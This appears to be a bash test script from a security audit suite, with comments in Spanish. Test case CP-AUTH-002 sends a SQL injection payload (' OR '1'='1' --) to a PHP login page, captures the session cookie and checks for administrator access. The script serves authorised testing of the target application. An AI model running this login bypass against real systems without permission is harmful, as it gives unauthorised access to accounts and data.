#!/usr/bin/env bash
# CP-AUTH-002: SQL Injection en login (bypass de autenticacion)
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$DIR/00_common.sh"
OUT="$DIR/../resultados/raw_CP-AUTH-002.txt"

{
  echo "=== CP-AUTH-002: SQLi bypass login ==="
  echo "--- Request ---"
  echo "POST /setup/procesalogin.php"
  echo "frmusuario=' OR '1'='1' -- &frmpassword=cualquier_valor"
  echo
  echo "--- Response headers + body ---"
  curl -s -i -c /tmp/audit-mysql-run/cookies_auth002.txt \
    -X POST "$BASE_URL/setup/procesalogin.php" \
    --data-urlencode "frmusuario=' OR '1'='1' -- " \
    --data-urlencode "frmpassword=cualquier_valor"
  echo
  echo "--- Cookie jar (PHPSESSID establecida) ---"
  cat /tmp/audit-mysql-run/cookies_auth002.txt
  echo
  echo "--- Verificacion: acceso a index.php con la sesion obtenida ---"
  curl -s -b /tmp/audit-mysql-run/cookies_auth002.txt "$BASE_URL/index.php" | grep -i "Administrador" || echo "(no se encontro 'Administrador' en la respuesta)"
} | tee "$OUT"
